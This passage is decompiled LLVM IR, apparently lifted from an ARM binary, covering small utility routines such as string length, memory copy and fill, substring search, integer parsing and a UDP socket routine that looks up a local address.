  uselistorder i32 23, { 0, 3, 1, 2 }
  uselistorder i32 29, { 0, 12, 1, 7, 5, 8, 2, 9, 3, 10, 4, 11, 13, 6 }
  uselistorder i32 (i32, i32, i32)* @function_10388, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_20a78.197 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @function_10318(i8* %arg1) local_unnamed_addr {
dec_label_pc_10318:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1031c = load i8, i8* %arg1, align 1
  %v2_10320 = icmp eq i8 %v3_1031c, 0
  %v0_10324 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10320, i32 %v0_10324)
  br label %dec_label_pc_1032c

dec_label_pc_1032c:                               ; preds = %dec_label_pc_1032c, %dec_label_pc_10318
  %v0_1032c = phi i32 [ %v1_1032c, %dec_label_pc_1032c ], [ 0, %dec_label_pc_10318 ]
  %v1_1032c = add i32 %v0_1032c, 1
  %v2_10330 = add i32 %v1_1032c, %tmp
  %v3_10330 = inttoptr i32 %v2_10330 to i8*
  %v4_10330 = load i8, i8* %v3_10330, align 1
  %v2_10334 = icmp eq i8 %v4_10330, 0
  br i1 %v2_10334, label %dec_label_pc_1033c, label %dec_label_pc_1032c

dec_label_pc_1033c:                               ; preds = %dec_label_pc_1032c
  ret i32 %v1_1032c
}

define i32 @function_10340(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10340:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_10340 = load i8, i8* %arg1, align 1
  %v3_10340 = zext i8 %v2_10340 to i32
  store i32 %v3_10340, i32* @r2, align 4
  %v2_10344 = icmp eq i8 %v2_10340, 0
  br i1 %v2_10344, label %bb, label %dec_label_pc_10350

bb:                                               ; preds = %dec_label_pc_10340
  store i32 %v3_10340, i32* @ip, align 4
  br label %dec_label_pc_10364

dec_label_pc_10350:                               ; preds = %dec_label_pc_10340
  br label %dec_label_pc_10354

dec_label_pc_10354:                               ; preds = %dec_label_pc_10354, %dec_label_pc_10350
  %v0_10354 = phi i32 [ %v1_10354, %dec_label_pc_10354 ], [ 0, %dec_label_pc_10350 ]
  %v1_10354 = add i32 %v0_10354, 1
  store i32 %v1_10354, i32* @ip, align 4
  %v2_10358 = add i32 %v1_10354, %tmp
  %v3_10358 = inttoptr i32 %v2_10358 to i8*
  %v4_10358 = load i8, i8* %v3_10358, align 1
  %v2_1035c = icmp eq i8 %v4_10358, 0
  br i1 %v2_1035c, label %dec_label_pc_10364, label %dec_label_pc_10354

dec_label_pc_10364:                               ; preds = %dec_label_pc_10354, %bb
  %v0_10364 = phi i32 [ %v3_10340, %bb ], [ %v1_10354, %dec_label_pc_10354 ]
  br label %dec_label_pc_10370

dec_label_pc_1036c:                               ; preds = %dec_label_pc_10370
  %v0_1036c = load i32, i32* %r1.global-to-local, align 4
  %v1_1036c = add i32 %v0_1036c, 1
  %v2_1036c = inttoptr i32 %v1_1036c to i8*
  %v3_1036c = load i8, i8* %v2_1036c, align 1
  %v4_1036c = zext i8 %v3_1036c to i32
  store i32 %v4_1036c, i32* @r2, align 4
  store i32 %v1_1036c, i32* %r1.global-to-local, align 4
  %v0_10370.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_10370

dec_label_pc_10370:                               ; preds = %dec_label_pc_10364, %dec_label_pc_1036c
  %v0_10378.off0 = phi i8 [ %v2_10340, %dec_label_pc_10364 ], [ %v3_1036c, %dec_label_pc_1036c ]
  %v0_10370 = phi i32 [ %v0_10364, %dec_label_pc_10364 ], [ %v0_10370.pr, %dec_label_pc_1036c ]
  %v1_10370 = add i32 %v0_10370, -1
  store i32 %v1_10370, i32* @r3, align 4
  %v3_10374 = icmp eq i32 %v0_10370, 0
  %v2_10378 = load i32, i32* @r0, align 4
  %v3_10378 = inttoptr i32 %v2_10378 to i8*
  store i8 %v0_10378.off0, i8* %v3_10378, align 1
  %v4_10378 = load i32, i32* @r0, align 4
  %v5_10378 = add i32 %v4_10378, 1
  store i32 %v5_10378, i32* @r0, align 4
  br i1 %v3_10374, label %dec_label_pc_10380, label %dec_label_pc_1036c

dec_label_pc_10380:                               ; preds = %dec_label_pc_10370
  %v0_10380 = load i32, i32* @ip, align 4
  ret i32 %v0_10380

; uselistorder directives
  uselistorder i32 %v0_10370, { 1, 0 }
  uselistorder i32 %v1_10354, { 0, 1, 3, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10370, { 1, 0 }
}

define i32 @function_10388(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10388:
  %v2_10388 = icmp eq i32 %arg3, 0
  %v0_1038c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10388, i32 %v0_1038c)
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10394

dec_label_pc_10394:                               ; preds = %dec_label_pc_10394, %dec_label_pc_10388
  %v0_10394 = phi i32 [ %v1_1039c, %dec_label_pc_10394 ], [ 0, %dec_label_pc_10388 ]
  %v2_10394 = add i32 %v0_10394, %arg2
  %v3_10394 = inttoptr i32 %v2_10394 to i8*
  %v4_10394 = load i8, i8* %v3_10394, align 1
  %v4_10398 = add i32 %v0_10394, %arg1
  %v5_10398 = inttoptr i32 %v4_10398 to i8*
  store i8 %v4_10394, i8* %v5_10398, align 1
  %v0_1039c = load i32, i32* @ip, align 4
  %v1_1039c = add i32 %v0_1039c, 1
  store i32 %v1_1039c, i32* @ip, align 4
  %v9_103a0 = icmp eq i32 %v1_1039c, %arg3
  br i1 %v9_103a0, label %dec_label_pc_103a8, label %dec_label_pc_10394

dec_label_pc_103a8:                               ; preds = %dec_label_pc_10394
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1039c, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_103ac() local_unnamed_addr {
dec_label_pc_103ac:
  %r2.global-to-local = alloca i32, align 4
  %v0_103ac = load i32, i32* @r1, align 4
  %v2_103ac = icmp eq i32 %v0_103ac, 0
  %v0_103b0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_103ac, i32 %v0_103b0)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_103b8

dec_label_pc_103b8:                               ; preds = %dec_label_pc_103b8, %dec_label_pc_103ac
  %v2_103bc = phi i32 [ %v1_103c0, %dec_label_pc_103b8 ], [ 0, %dec_label_pc_103ac ]
  store i32 0, i32* @r3, align 4
  %v3_103bc = load i32, i32* @r0, align 4
  %v4_103bc = add i32 %v3_103bc, %v2_103bc
  %v5_103bc = inttoptr i32 %v4_103bc to i8*
  store i8 0, i8* %v5_103bc, align 1
  %v0_103c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_103c0 = add i32 %v0_103c0, 1
  store i32 %v1_103c0, i32* %r2.global-to-local, align 4
  %v1_103c4 = load i32, i32* @r1, align 4
  %v9_103c4 = icmp eq i32 %v1_103c0, %v1_103c4
  br i1 %v9_103c4, label %dec_label_pc_103cc, label %dec_label_pc_103b8

dec_label_pc_103cc:                               ; preds = %dec_label_pc_103b8
  %v1_103cc = load i32, i32* @r0, align 4
  ret i32 %v1_103cc

; uselistorder directives
  uselistorder i32 %v1_103c0, { 1, 2, 0 }
}

define i32 @function_103d0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_103d0:
  %v7_103e4 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_103e4, label %dec_label_pc_103ec, label %dec_label_pc_103f4

dec_label_pc_103ec:                               ; preds = %dec_label_pc_10408, %dec_label_pc_103f4, %dec_label_pc_103d0, %dec_label_pc_10434
  %storemerge = phi i32 [ %v1_10434, %dec_label_pc_10434 ], [ -1, %dec_label_pc_103d0 ], [ -1, %dec_label_pc_103f4 ], [ -1, %dec_label_pc_10408 ]
  ret i32 %storemerge

dec_label_pc_103f4:                               ; preds = %dec_label_pc_103d0
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_103ec, label %dec_label_pc_103fc

dec_label_pc_103fc:                               ; preds = %dec_label_pc_103f4
  br label %dec_label_pc_10414

dec_label_pc_10408:                               ; preds = %bb, %dec_label_pc_10428
  %v1_104143 = phi i32 [ %v1_10428, %dec_label_pc_10428 ], [ 0, %bb ]
  %v1_10408 = add i32 %v0_10434, 1
  %v9_1040c = icmp eq i32 %v1_10408, %arg2
  br i1 %v9_1040c, label %dec_label_pc_103ec, label %dec_label_pc_10414

dec_label_pc_10414:                               ; preds = %dec_label_pc_10408, %dec_label_pc_103fc
  %v0_10434 = phi i32 [ %v1_10408, %dec_label_pc_10408 ], [ 0, %dec_label_pc_103fc ]
  %v1_10414 = phi i32 [ %v1_104143, %dec_label_pc_10408 ], [ 0, %dec_label_pc_103fc ]
  %v2_10414 = add i32 %v1_10414, %arg3
  %v3_10414 = inttoptr i32 %v2_10414 to i8*
  %v4_10414 = load i8, i8* %v3_10414, align 1
  %v2_10418 = add i32 %v0_10434, %arg1
  %v3_10418 = inttoptr i32 %v2_10418 to i8*
  %v4_10418 = load i8, i8* %v3_10418, align 1
  %v9_1041c = icmp eq i8 %v4_10418, %v4_10414
  br i1 %v9_1041c, label %dec_label_pc_10428, label %bb

bb:                                               ; preds = %dec_label_pc_10414
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10408

dec_label_pc_10428:                               ; preds = %dec_label_pc_10414
  %v1_10428 = add i32 %v1_10414, 1
  store i32 %v1_10428, i32* @ip, align 4
  %v9_1042c = icmp eq i32 %v1_10428, %arg4
  br i1 %v9_1042c, label %dec_label_pc_10434, label %dec_label_pc_10408

dec_label_pc_10434:                               ; preds = %dec_label_pc_10428
  %v1_10434 = add i32 %v0_10434, 1
  br label %dec_label_pc_103ec

; uselistorder directives
  uselistorder i32 %v1_10428, { 1, 2, 0 }
  uselistorder i32 %v1_10414, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10408, { 1, 0 }
  uselistorder label %dec_label_pc_103ec, { 3, 0, 1, 2 }
}

define i32 @function_1043c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1043c:
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1043c = load i32, i32* @r4, align 4
  %v12_1043c = load i32, i32* @r7, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1044c

dec_label_pc_1044c:                               ; preds = %.thread, %dec_label_pc_10460, %bb, %dec_label_pc_1043c
  %v0_1044c = phi i32 [ %tmp, %dec_label_pc_1043c ], [ %v5_1044c, %bb ], [ %v5_1044c, %dec_label_pc_10460 ], [ %v5_1044c, %.thread ]
  %v1_1044c = inttoptr i32 %v0_1044c to i8*
  %v2_1044c = load i8, i8* %v1_1044c, align 1
  %v5_1044c = add i32 %v0_1044c, 1
  store i32 %v5_1044c, i32* %r5.global-to-local, align 4
  %v7_10450 = icmp eq i8 %v2_1044c, 9
  br i1 %v7_10450, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_1044c
  br label %dec_label_pc_1044c

bb:                                               ; preds = %dec_label_pc_1044c
  %v3_1044c = zext i8 %v2_1044c to i32
  %v8_10454 = icmp eq i8 %v2_1044c, 32
  store i32 %v3_1044c, i32* @r4, align 4
  br i1 %v8_10454, label %dec_label_pc_1044c, label %dec_label_pc_10460

dec_label_pc_10460:                               ; preds = %bb
  %v7_10460 = icmp eq i8 %v2_1044c, 10
  br i1 %v7_10460, label %dec_label_pc_1044c, label %dec_label_pc_10468

dec_label_pc_10468:                               ; preds = %dec_label_pc_10460
  %v7_10468 = icmp eq i8 %v2_1044c, 45
  br i1 %v7_10468, label %dec_label_pc_10558, label %dec_label_pc_10470

dec_label_pc_10470:                               ; preds = %dec_label_pc_10468
  %v7_10470 = icmp eq i8 %v2_1044c, 43
  br i1 %v7_10470, label %bb44, label %dec_label_pc_10480

bb44:                                             ; preds = %dec_label_pc_10470
  %v2_10474 = inttoptr i32 %v5_1044c to i8*
  %v3_10474 = load i8, i8* %v2_10474, align 1
  %v4_10474 = zext i8 %v3_10474 to i32
  store i32 %v4_10474, i32* @r4, align 4
  %v6_10474 = add i32 %v0_1044c, 2
  store i32 %v6_10474, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10480

dec_label_pc_10480:                               ; preds = %bb44, %dec_label_pc_10470, %dec_label_pc_10558
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_10558 ], [ 2147483647, %dec_label_pc_10470 ], [ 2147483647, %bb44 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_10558 ], [ 0, %dec_label_pc_10470 ], [ 0, %bb44 ]
  store i32 %storemerge1, i32* @r7, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_10488 = call i32 @function_10970(i32 %storemerge1, i32 %arg2)
  %v0_1048c = load i32, i32* @r7, align 4
  store i32 %v0_1048c, i32* @r0, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  %v0_10494 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_10494, i32* @r1, align 4
  %v0_10498 = call i32 @function_10874()
  %v0_104a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_104a8.outer

dec_label_pc_104a8.outer:                         ; preds = %.thread5, %dec_label_pc_10480
  %v2_10524.ph = phi i32 [ %v5_10524, %.thread5 ], [ 0, %dec_label_pc_10480 ]
  %v1_104e8.ph = phi i32 [ %v4_10528, %.thread5 ], [ %v0_104a8.pre, %dec_label_pc_10480 ]
  %v1_10500.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_10480 ]
  %v3_104f4 = icmp uge i32 %v2_10524.ph, %v0_10498
  %v9_104f4 = icmp eq i32 %v2_10524.ph, %v0_10498
  %v2_104f8 = xor i1 %v3_104f4, true
  %v3_104f8 = or i1 %v9_104f4, %v2_104f8
  %v2_104fc = xor i1 %v9_104f4, true
  %v3_104fc = and i1 %v3_104f4, %v2_104fc
  %v2_1051c = icmp eq i1 %v9_104f4, false
  br label %dec_label_pc_104a8

dec_label_pc_104a8:                               ; preds = %dec_label_pc_104a8.outer, %dec_label_pc_10530
  %v1_10500 = phi i32 [ -1, %dec_label_pc_10530 ], [ %v1_10500.ph, %dec_label_pc_104a8.outer ]
  %v1_104e8 = phi i32 [ %v3_10530, %dec_label_pc_10530 ], [ %v1_104e8.ph, %dec_label_pc_104a8.outer ]
  %v1_104a8 = urem i32 %v1_104e8, 256
  %v1_104ac = add nsw i32 %v1_104a8, -48
  %v1_104b4 = add nsw i32 %v1_104a8, -97
  %v1_104b8 = add i32 %v1_104e8, -48
  %v1_104bc = add nsw i32 %v1_104a8, -65
  %tmp75 = icmp ult i32 %v1_104ac, 10
  br i1 %tmp75, label %dec_label_pc_104ec, label %dec_label_pc_104c4

dec_label_pc_104c4:                               ; preds = %dec_label_pc_104a8
  %v2_104c4 = icmp ugt i32 %v1_104bc, 24
  %v7_104c4 = icmp eq i32 %v1_104bc, 25
  %v2_104c8 = xor i1 %v7_104c4, true
  %v3_104c8 = and i1 %v2_104c4, %v2_104c8
  br i1 %v3_104c8, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_104c4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_104c4, %bb45
  %v0_104dc14 = phi i32 [ %v1_104b8, %dec_label_pc_104c4 ], [ 0, %bb45 ]
  %v2_104cc = xor i1 %v2_104c4, true
  %v3_104cc = or i1 %v7_104c4, %v2_104cc
  br i1 %v3_104cc, label %bb47, label %bb48

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_104dc = phi i32 [ %v0_104dc14, %bb46 ], [ 1, %bb47 ]
  br i1 %v3_104c8, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  %v6_104d4 = icmp ugt i32 %v1_104b4, 24
  %v11_104d4 = icmp eq i32 %v1_104b4, 25
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_104d8 = phi i1 [ %v7_104c4, %bb48 ], [ %v11_104d4, %bb49 ]
  %v0_104d8 = phi i1 [ %v2_104c4, %bb48 ], [ %v6_104d4, %bb49 ]
  %v2_104d8 = xor i1 %v1_104d8, true
  %v3_104d8 = and i1 %v0_104d8, %v2_104d8
  br i1 %v3_104d8, label %dec_label_pc_1053c, label %dec_label_pc_104dc

dec_label_pc_104dc:                               ; preds = %bb50
  %v2_104dc = icmp eq i32 %v0_104dc, 0
  %. = select i1 %v2_104dc, i32 87, i32 55
  %v2_104e8 = sub i32 %v1_104e8, %.
  br label %dec_label_pc_104ec

dec_label_pc_104ec:                               ; preds = %dec_label_pc_104a8, %dec_label_pc_104dc
  %v0_1050029 = phi i32 [ %v1_104bc, %dec_label_pc_104a8 ], [ %., %dec_label_pc_104dc ]
  %v3_10524 = phi i32 [ %v1_104b8, %dec_label_pc_104a8 ], [ %v2_104e8, %dec_label_pc_104dc ]
  %v1_104ec = load i32, i32* %r6.global-to-local, align 4
  %v2_104ec = sub i32 %v3_10524, %v1_104ec
  %v4_104ec = xor i32 %v1_104ec, %v3_10524
  %v5_104ec = xor i32 %v2_104ec, %v3_10524
  %v6_104ec = and i32 %v5_104ec, %v4_104ec
  %v7_104ec = icmp slt i32 %v6_104ec, 0
  %v8_104ec = icmp slt i32 %v2_104ec, 0
  %v2_104f0 = xor i1 %v8_104ec, %v7_104ec
  br i1 %v2_104f0, label %dec_label_pc_104f4, label %dec_label_pc_1053c

dec_label_pc_104f4:                               ; preds = %dec_label_pc_104ec
  br i1 %v3_104f8, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_104f4
  br label %bb54

bb54:                                             ; preds = %dec_label_pc_104f4, %bb53
  %v0_1050028 = phi i32 [ %v0_1050029, %dec_label_pc_104f4 ], [ 0, %bb53 ]
  br i1 %v3_104fc, label %bb55, label %bb56

bb55:                                             ; preds = %bb54
  br label %bb56

bb56:                                             ; preds = %bb54, %bb55
  %v0_10500 = phi i32 [ %v0_1050028, %bb54 ], [ 1, %bb55 ]
  %tmp76 = icmp slt i32 %v1_10500, 0
  %v4_10500 = zext i1 %tmp76 to i32
  %v5_10500 = or i32 %v0_10500, %v4_10500
  %v7_10500 = icmp eq i32 %v5_10500, 0
  br i1 %v7_10500, label %dec_label_pc_10508, label %dec_label_pc_10530

dec_label_pc_10508:                               ; preds = %bb56
  %v1_10514 = load i32, i32* %r8.global-to-local, align 4
  %v2_10514 = sub i32 %v3_10524, %v1_10514
  %v4_10514 = xor i32 %v1_10514, %v3_10524
  %v5_10514 = xor i32 %v2_10514, %v3_10524
  %v6_10514 = and i32 %v5_10514, %v4_10514
  %v7_10514 = icmp slt i32 %v6_10514, 0
  %v8_10514 = icmp slt i32 %v2_10514, 0
  %v9_10514 = icmp eq i32 %v3_10524, %v1_10514
  %v3_10518 = xor i1 %v8_10514, %v7_10514
  %v4_10518 = or i1 %v9_10514, %v3_10518
  br i1 %v4_10518, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10508
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10508
  br i1 %v2_1051c, label %.thread5, label %dec_label_pc_10530

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_10524 = mul i32 %v1_104ec, %v2_10524.ph
  %v5_10524 = add i32 %v4_10524, %v3_10524
  %v1_10528 = load i32, i32* %r5.global-to-local, align 4
  %v2_10528 = inttoptr i32 %v1_10528 to i8*
  %v3_10528 = load i8, i8* %v2_10528, align 1
  %v4_10528 = zext i8 %v3_10528 to i32
  %v6_10528 = add i32 %v1_10528, 1
  store i32 %v6_10528, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_104a8.outer

dec_label_pc_10530:                               ; preds = %thread-pre-split, %bb56
  %v0_10530 = load i32, i32* %r5.global-to-local, align 4
  %v1_10530 = inttoptr i32 %v0_10530 to i8*
  %v2_10530 = load i8, i8* %v1_10530, align 1
  %v3_10530 = zext i8 %v2_10530 to i32
  %v5_10530 = add i32 %v0_10530, 1
  store i32 %v5_10530, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_104a8

dec_label_pc_1053c:                               ; preds = %dec_label_pc_104ec, %bb50
  %v1_1053c = icmp slt i32 %v1_10500, 0
  %v0_10568 = load i32, i32* %sl.global-to-local, align 4
  %v2_10568 = icmp eq i32 %v0_10568, 0
  br i1 %v1_1053c, label %dec_label_pc_10568, label %dec_label_pc_10544

dec_label_pc_10544:                               ; preds = %dec_label_pc_1053c
  br i1 %v2_10568, label %bb60, label %bb59

bb59:                                             ; preds = %dec_label_pc_10544
  %v2_10548 = sub i32 0, %v2_10524.ph
  br label %bb60

bb60:                                             ; preds = %.thread32, %bb61, %dec_label_pc_10544, %bb59
  %v1_10554 = phi i32 [ -2147483648, %bb61 ], [ %v2_10524.ph, %dec_label_pc_10544 ], [ %v2_10548, %bb59 ], [ 2147483647, %.thread32 ]
  store i32 %v3_1043c, i32* @r4, align 4
  store i32 %v12_1043c, i32* @r7, align 4
  ret i32 %v1_10554

dec_label_pc_10558:                               ; preds = %dec_label_pc_10468
  %v1_10558 = inttoptr i32 %v5_1044c to i8*
  %v2_10558 = load i8, i8* %v1_10558, align 1
  %v3_10558 = zext i8 %v2_10558 to i32
  store i32 %v3_10558, i32* @r4, align 4
  %v5_10558 = add i32 %v0_1044c, 2
  store i32 %v5_10558, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10480

dec_label_pc_10568:                               ; preds = %dec_label_pc_1053c
  br i1 %v2_10568, label %.thread32, label %bb61

.thread32:                                        ; preds = %dec_label_pc_10568
  br label %bb60

bb61:                                             ; preds = %dec_label_pc_10568
  br label %bb60

; uselistorder directives
  uselistorder i1 %v2_10568, { 1, 0 }
  uselistorder i32 %v2_10514, { 1, 0 }
  uselistorder i32 %v1_10514, { 1, 0, 2 }
  uselistorder i32 %v2_104ec, { 1, 0 }
  uselistorder i32 %v3_10524, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_104c4, { 1, 2, 0 }
  uselistorder i1 %v2_104c4, { 1, 0, 2 }
  uselistorder i32 %v1_104a8, { 1, 2, 0 }
  uselistorder i32 %v1_104e8, { 1, 2, 0 }
  uselistorder i32 %v1_10500, { 1, 0 }
  uselistorder i1 %v9_104f4, { 1, 0, 2 }
  uselistorder i1 %v3_104f4, { 1, 0 }
  uselistorder i32 %v2_10524.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v0_10498, { 1, 0 }
  uselistorder i32 %v5_1044c, { 3, 4, 5, 2, 1, 0 }
  uselistorder i8 %v2_1044c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_1044c, { 0, 1, 3, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 5, 2, 4, 3, 6, 7 }
  uselistorder i32 25, { 17, 18, 9, 2, 10, 3, 11, 4, 12, 0, 13, 5, 14, 1, 15, 6, 7, 16, 8, 19 }
  uselistorder i8 32, { 9, 10, 11, 0, 12, 13, 14, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i8 9, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %bb60, { 1, 0, 3, 2 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %dec_label_pc_104ec, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_104a8, { 1, 0 }
  uselistorder label %dec_label_pc_10480, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1044c, { 1, 2, 0, 3 }
}

define i32 @function_10578(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10578:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10578 = load i32, i32* @r4, align 4
  store i32 %v3_10578, i32* %stack_var_-24, align 4
  %v12_10578 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10590

dec_label_pc_10590:                               ; preds = %dec_label_pc_105b4.dec_label_pc_10590_crit_edge, %dec_label_pc_10578
  %v0_10594 = phi i32 [ %v0_10594.pre, %dec_label_pc_105b4.dec_label_pc_10590_crit_edge ], [ %arg3, %dec_label_pc_10578 ]
  %v1_1059c = call i32 @function_10b70(i32 %v0_10594)
  %v7_105a0 = icmp eq i32 %v1_1059c, 1
  %v0_105a8 = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_105a0, label %dec_label_pc_105a8, label %dec_label_pc_105c0

dec_label_pc_105a8:                               ; preds = %dec_label_pc_10590
  %v1_105a8 = add i32 %v0_105a8, 1
  store i32 %v1_105a8, i32* %r5.global-to-local, align 4
  %v1_105ac = load i32, i32* %r8.global-to-local, align 4
  %v6_105b0 = icmp slt i32 %v1_105a8, %v1_105ac
  br i1 %v6_105b0, label %dec_label_pc_105b4, label %.loopexit

dec_label_pc_105b4:                               ; preds = %dec_label_pc_105a8
  %v0_105b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_105b4 = inttoptr i32 %v0_105b4 to i8*
  %v2_105b4 = load i8, i8* %v1_105b4, align 1
  %v5_105b4 = add i32 %v0_105b4, 1
  store i32 %v5_105b4, i32* %r4.global-to-local, align 4
  %v7_105b8 = icmp eq i8 %v2_105b4, 10
  br i1 %v7_105b8, label %dec_label_pc_105c0, label %dec_label_pc_105b4.dec_label_pc_10590_crit_edge

dec_label_pc_105b4.dec_label_pc_10590_crit_edge:  ; preds = %dec_label_pc_105b4
  %v0_10594.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10590

dec_label_pc_105c0:                               ; preds = %dec_label_pc_10590, %dec_label_pc_105b4
  %v0_105c0 = phi i32 [ %v1_105a8, %dec_label_pc_105b4 ], [ %v0_105a8, %dec_label_pc_10590 ]
  %v2_105c0 = icmp eq i32 %v0_105c0, 0
  br i1 %v2_105c0, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_105c0
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_105a8, %dec_label_pc_105c0, %bb
  %v0_105c8 = load i32, i32* @r7, align 4
  %v2_105cc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_105cc, i32* @r4, align 4
  store i32 %v12_10578, i32* @r7, align 4
  ret i32 %v0_105c8

; uselistorder directives
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_105c0, { 1, 0 }
}

define i32 @function_105d4() local_unnamed_addr {
dec_label_pc_105d4:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 16, i32* %r6.global-to-local, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_105e4 = call i32 @function_11200()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_105ec = inttoptr i32 %v0_105e4 to i32*
  store i32 0, i32* %v2_105ec, align 4
  %v0_105f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_105fc = call i32 @function_115e4(i32 2, i32 2, i32 %v0_105f8)
  %v7_10600 = icmp eq i32 %v3_105fc, -1
  store i32 %v3_105fc, i32* %r5.global-to-local, align 4
  br i1 %v7_10600, label %bb, label %dec_label_pc_10610

bb:                                               ; preds = %dec_label_pc_105d4
  %v1_10608 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1065c

dec_label_pc_10610:                               ; preds = %dec_label_pc_105d4
  %v2_1061c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1061c, i32* %r4.global-to-local, align 4
  %v0_10628 = load i32, i32* %r6.global-to-local, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_1063c = call i32 @function_113cc(i32 %v3_105fc, i32 %v2_1061c, i32 %v0_10628)
  %v2_10644 = ptrtoint i32* %stack_var_-20 to i32
  %v0_10648 = load i32, i32* %r5.global-to-local, align 4
  %v3_1064c = call i32 @function_11404(i32 %v0_10648, i32 %v2_1061c, i32 %v2_10644)
  %v1_10654 = call i32 @function_10dd8(i32 %v0_10648)
  br label %dec_label_pc_1065c

dec_label_pc_1065c:                               ; preds = %bb, %dec_label_pc_10610
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10610 ], [ %v1_10608, %bb ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_105fc, { 1, 2, 0 }
